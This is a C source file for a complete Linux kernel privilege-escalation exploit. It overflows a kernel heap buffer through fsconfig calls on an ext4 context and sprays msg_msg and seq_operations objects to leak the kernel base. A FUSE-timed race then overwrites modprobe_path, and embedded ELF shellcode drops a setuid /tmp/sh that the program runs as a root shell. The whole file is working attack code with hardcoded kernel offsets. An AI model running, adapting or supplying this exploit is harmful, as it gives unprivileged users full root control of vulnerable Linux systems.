// gcc -no-pie -static exploit_fuse.c fakefuse.c util.c -I./libfuse libfuse3.a -o exploit -masm=intel -pthread
#define _GNU_SOURCE
#include <stdbool.h>
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>
#include <stdint.h>
#include "fakefuse.h"

int fd = -1;
int fdv[0x10] = {0};

uint64_t modprobe_path;
uint64_t offsets[] = {0x336770, 0x186c160};  // ffffffff81336770  0xffffffff8286c160 <modprobe_path>:	"/sbin/modprobe"
enum {SINGLE_START = 0, MODPROBE};

void debug() 
{
    puts("Paused...");
    getchar();
}

void print_hex( char *buf,int size){
    int i;
    puts("======================================");
    printf("data :\n");
    for (i=0 ; i<(size/8);i++){
        if (i%2 == 0){
            printf("%d",i/2);
        }
        printf(" %16llx",*(size_t * )(buf + i*8));
        if (i%2 == 1){
            printf("\n");
        }       
    }
    puts("======================================");
}

uint64_t do_check_leak(char *buf) 
{
    uint64_t kbase = ((uint64_t *)buf)[510] - offsets[SINGLE_START];
    if (kbase & 0x1fffff || kbase == 0 || (kbase & (0xfffffful << 40)) != ((0xfffffful << 40))) {
        return 0;
    }
    return kbase;
}
// change msg_msg->m_ts to leak seq_operations->stop     (510*8-0xfd0 = 0x20)
uint64_t do_leak () 
{
    uint64_t kbase = 0;
    char pat[0x1000] = {0};
    char buffer[0x2000] = {0}, recieved[0x2000] = {0};
    int targets[0x10] = {0};
    msg *message = (msg *)buffer;
    int size = 0x1018;

// (1) spray 8 msg_msg    (kmalloc-4k -> kmalloc-32)
    for (int i = 0; i < 8; i++) 
    {
        memset(buffer, 0x41+i, sizeof(buffer));
        targets[i] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
        send_msg(targets[i], message, size - 0x30, 0);
    }
// (2) open ext4
    memset(pat, 0x42, sizeof(pat));
    pat[sizeof(pat)-1] = '\x00';
    puts("[*] Opening ext4 filesystem");

    fd = fsopen("ext4", 0);
    if (fd < 0) 
    {
            puts("fsopen: Remember to unshare");
            exit(-1);
    }
// (3) prepare to overflow ->  size = 4095 = 117*(33+2)
    strcpy(pat, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    for (int i = 0; i < 117; i++) 
    {
        fsconfig(fd, FSCONFIG_SET_STRING, "\x00", pat, 0);
    }
    
// (4) overflow (21+1) bytes ----- at offset [0, 21] 
    puts("[*] Overflowing...");
    pat[21] = '\x00';
    char evil[] = "\x60\x10";
    fsconfig(fd, FSCONFIG_SET_STRING, "\x00", pat, 0);

// (5) spray more msg_msg    (kmalloc-4k -> kmalloc-32)
    for (int i = 8; i < 0x10; i++) 
    {
        memset(buffer, 0x41+i, sizeof(buffer));
        targets[i] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
        send_msg(targets[i], message, size - 0x30, 0);
    }
// (6) overflow to change msg_msg->m_ts = 0x1060    ([22, 23] = ",=")
    fsconfig(fd, FSCONFIG_SET_STRING, "\x00", evil, 0);
// (7) spray 100 seq_operations in kmalloc-32
    puts("[*] Done heap overflow");
    puts("[*] Spraying kmalloc-32");
    for (int i = 0; i < 100; i++) 
    {
        open("/proc/self/stat", O_RDONLY);
    }

    size = 0x1060;
    puts("[*] Attempting to recieve corrupted size and leak data");

// (8) leak kernel base (read msg_msg)
    for (int j = 0; j < 0x10; j++) 
    {
        get_msg(targets[j], recieved, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
        kbase = do_check_leak(recieved);
        if (kbase) 
        {
            close(fd);
            return kbase;
        }
    }

    puts("[X] No leaks, trying again");
    return 0;
}

// overflow to change msg_msg.next to modprobe_path - 8
void *arb_write(void *args)
{
    uint64_t goal = modprobe_path - 8;
    char pat[0x1000] = {0};
    memset(pat, 0x41, 29);
    char evil[0x20];
    memcpy(evil, (void *)&goal, 8);
    for (int i = 0; i < 0xa; i++)
    {
        fsconfig(fdv[i], FSCONFIG_SET_STRING, "\x00", pat, 0);      // overflow (29+1) bytes ----- at offset [0, 29] 
        fsconfig(fdv[i], FSCONFIG_SET_STRING, "\x00", evil, 0);     // overflow to change msg_msg->next = goal    ([30, 31] = ",=")
    }
    puts("[*] Done heap overflow");
    write(fuse_pipes[1], "A", 1);   // notify that can write to msg_msg->next (modprobe_path-8)
}

// msg_msg arb write trick by hanging before msgseg on usercopy
// use FUSE to time the race
void do_win() 
{
    int size = 0x1000;
    char buffer[0x2000] = {0};
    char pat[0x1000] = {0};
    msg* message = (msg*)buffer;
    memset(buffer, 0x44, sizeof(buffer));
// (1) mmap address
    void *evil_page = mmap((void *)0x1337000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);
    uint64_t race_page = 0x1338000;
    msg *rooter = (msg *)(race_page-0x8);
    rooter->mtype = 1;
    size = 0x1010;

    int target = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
    send_msg(target, message, size - 0x30, 0);
// (2) prepare to overflow ->  size = 4095 = 117*(33+2)
    puts("[*] Opening ext4 filesystem");
    strcpy(pat, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    for (int i = 0; i < 0xa; i++)
    {
        fdv[i] = fsopen("ext4", 0);
        if (fdv[i] < 0) 
        {
            puts("Opening");
            exit(-1);
        }
        for (int j = 0; j < 117; j++) 
            fsconfig(fdv[i], FSCONFIG_SET_STRING, "\x00", pat, 0);
    }
    /*
    fd = fsopen("ext4", 0);
    if (fd < 0) 
    {
            puts("Opening");
            exit(-1);
    }
    puts("[*] Overflowing...");
    strcpy(pat, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    for (int i = 0; i < 117; i++) 
    {
        fsconfig(fd, FSCONFIG_SET_STRING, "\x00", pat, 0);
    }*/
// (3) prepare fault hanlers via FUSE at 0x1338000  
    puts("[*] Prepaing fault handlers via FUSE");
    int evil_fd = open("evil/evil", O_RDWR);
    if (evil_fd < 0)
    {
        perror("evil fd failed");
        exit(-1);
    }
    if ((mmap((void *)0x1338000, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, evil_fd, 0)) != (void *)0x1338000)
    {
        perror("mmap fail fuse 1");
        exit(-1);
    }
// (4) change msg_msg->next = modprobe_path-8
    pthread_t thread;
    int race = pthread_create(&thread, NULL, arb_write, NULL);
    if(race != 0)
    {
        perror("can't setup threads for race");
    }
// (5) send msg & trigger page fault at 0x1338000, 
    send_msg(target, rooter, size - 0x30, 0);
    pthread_join(thread, NULL);
    munmap((void *)0x1337000, 0x1000);
    munmap((void *)0x1338000, 0x1000);
    close(evil_fd);
    // close(fd);
}
// spary msg_msg in kmalloc-4k
void spray_4k(int spray)
{
    char buffer[0x2000] = {0}, recieved[0x2000] = {0};
    msg *message = (msg *)buffer;
    int size = 0x1000;

    memset(buffer, 0x41, sizeof(buffer));
    for (int i = 0; i < spray; i++)
    {
        int spray = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
        send_msg(spray, message, size - 0x30, 0);
    }
}

void modprobe_init()
{
    char filename[65];
    memset(filename, 0, sizeof(filename));
    int fd = open(modprobe_trigger, O_RDWR | O_CREAT);  // modprobe_trigger —— fault binary to trigger modprobe
    if (fd < 0)
    {
        perror("trigger creation failed");
        exit(-1);
    }
    char root[] = "\xff\xff\xff\xff";
    write(fd, root, sizeof(root));
    close(fd);
    chmod(modprobe_trigger, 0777);

    unsigned char elfcode[] = {
        0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02,
        0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,
        0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2,
        0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f,
        0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d,
        0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00,
        0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff,
        0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d,
        0x70, 0x2f, 0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e,
        0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,
        0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
        0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
        0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69,
        0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a,
        0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00,
        0x6a, 0x00, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0,
        0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00,
        0x00, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00
    };
    FILE *fp;
    fp = fopen("/tmp/w", "wb");
    if (fp == NULL) {
        perror("fopen");
        return -1;
    }
    if (fwrite(elfcode, sizeof(elfcode), 1, fp) < 1) {
        perror("fwrite");
        return -1;
    }
    fclose(fp);

    system("chmod +x /tmp/w"); 
/*
    char w[] = "#!/bin/sh\nchmod u+s " SHELL "\n";
    fd = open(modprobe_win, O_RDWR | O_CREAT);
    if (fd < 0)
    {
        perror("winner creation failed");
        exit(-1);
    }
    write(fd, w, sizeof(w));
    close(fd);
    chmod(modprobe_win, 0777); */
    return; 
}

void modprobe_hax()
{
    puts("[*] Attempting to trigger modprobe");
    execve(modprobe_trigger, NULL, NULL);
    return;
}

void unshare_setup(uid_t uid, gid_t gid)
{
    int temp;
    char edit[0x100];
    unshare(CLONE_NEWNS|CLONE_NEWUSER);
    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);
    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);
    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);
    return;
}

static const struct fuse_operations evil_ops = {
    .getattr        = evil_getattr,
    .readdir        = evil_readdir,
    .read           = evil_read,
};

char *fargs_evil[] = {"exploit", "evil", NULL };

int main(int argc, char **argv, char **envp) 
{
    fargs_evil[0] = argv[0];
// 1. gain CAP_SYS_ADMIN privilege  & initialize
    unshare_setup(getuid(), getgid());
    mkdir(MNT_PATH, 0777);
    pipe(fuse_pipes);
    modprobe_init();

    if (!fork())
    {
        fuse_main(sizeof(fargs_evil)/sizeof(char *) -1 , fargs_evil, &evil_ops, NULL);
    }
// 2. change msg_msg->m_ts to leak seq_operations->stop
    sleep(1);
    spray_4k(30);
    uint64_t kbase = 0;
    while(!kbase) 
    {
        kbase = do_leak();
    }
    printf("[*] Kernel base 0x%lx\n", kbase);
    modprobe_path = (uint64_t)(kbase + (offsets[MODPROBE]));
    printf("[*] modprobe_path: 0x%lx\n", modprobe_path);
// 3. arb write to change modprobe_path
    spray_4k(30);
    while (1) 
    {
        do_win();
        modprobe_hax();
        struct stat check;

        if (stat("/tmp/sh", &check) >= 0)
            break;
/*
        if (stat(SHELL, &check) < 0)
        {
            perror("Error on checking");
            exit(-1);
        }
        if (check.st_mode & S_ISUID)
        {
            break;
        } */
    }
    
    puts("[*] Exploit success! " SHELL " is SUID now!");
    puts("[+] Popping shell");
    system("/tmp/sh");
    // execve(SHELL, root_argv, NULL);
    return 0;
}

/*
(1) offset
/exp $ cat /tmp/kallsyms | grep __request_module
ffffffff810cd090 T __request_module

gef➤  x /s 0xffffffff8286c160
0xffffffff8286c160 <modprobe_path>:	"/sbin/modprobe"

struct seq_operations {
	void * (*start) (struct seq_file *m, loff_t *pos);
	void (*stop) (struct seq_file *m, void *v);
	void * (*next) (struct seq_file *m, void *v, loff_t *pos);
	int (*show) (struct seq_file *m, void *v);
};

(2) 
alloc vulnerable object： legacy_parse_param()
    $ b fs/fs_context.c:541
		ctx->legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);
alloc msg_msg： alloc_msg()
    $ b ipc/msgutil.c:53
        msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);


*/

